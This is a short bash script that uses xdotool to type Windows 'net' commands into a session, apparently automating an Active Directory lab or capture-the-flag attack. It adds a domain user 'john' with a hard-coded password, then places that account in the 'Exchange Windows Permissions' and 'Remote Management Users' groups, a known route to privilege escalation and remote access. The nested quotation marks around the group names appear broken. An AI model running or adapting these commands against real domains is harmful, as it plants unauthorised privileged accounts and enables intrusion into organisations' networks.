#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "net user john abc123! /add /domain"
xdotool key Return

paste_command "net group "Exchange Windows Permissions" john /add"
xdotool key Return

paste_command "net localgroup "Remote Management Users" john /add"
xdotool key Return

